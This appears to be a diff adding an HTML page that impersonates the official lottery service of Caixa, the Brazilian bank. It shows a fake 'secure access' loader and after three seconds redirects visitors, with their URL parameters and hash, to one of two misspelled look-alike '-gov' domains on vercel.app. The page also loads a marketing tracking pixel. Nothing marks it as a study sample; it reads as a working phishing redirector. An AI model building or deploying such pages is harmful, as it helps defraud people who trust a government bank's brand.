@@ -1,0 +1,100 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Acesso Seguro</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
+<script>
+  window.pixelId = "69421b4dfb9175333f7aef83";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Montserrat', sans-serif;
+      background: #0057b8; /* azul Caixa */
+      color: white;
+      text-align: center;
+    }
+    .container {
+      max-width: 420px;
+      padding: 20px;
+    }
+    .title {
+      font-size: 22px;
+      font-weight: 700;
+      margin-top: 15px;
+    }
+    .subtitle {
+      font-size: 14px;
+      opacity: 0.9;
+      margin-top: 8px;
+    }
+    /* Loader */
+    .loader {
+      width: 60px;
+      height: 60px;
+      border: 5px solid rgba(255,255,255,0.3);
+      border-top-color: #ffba08;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .badge {
+      display: inline-block;
+      background: #ffba08;
+      color: #003b73;
+      font-weight: 700;
+      padding: 6px 14px;
+      border-radius: 20px;
+      margin-bottom: 15px;
+      font-size: 12px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="badge">LOTERIAS OFICIAL CAIXA</div>
+    <div class="loader"></div>
+    <div class="title">Acesso seguro</div>
+    <div class="subtitle">Você está sendo redirecionado…</div>
+  </div>
+
+  <script>
+    (function() {
+      const targets = [
+        'https://loteriasscaixaonlline-gov.vercel.app/0/',
+        'https://loteriasscaixaaonlline-gov.vercel.app/0/'
+      ];
+
+      const params = window.location.search || '';
+      const hash = window.location.hash || '';
+
+      const final = targets[Math.floor(Math.random() * targets.length)] + params + hash;
+
+      setTimeout(() => {
+        window.location.replace(final);
+      }, 3000);
+    })();
+  </script>
+</body>
+</html>
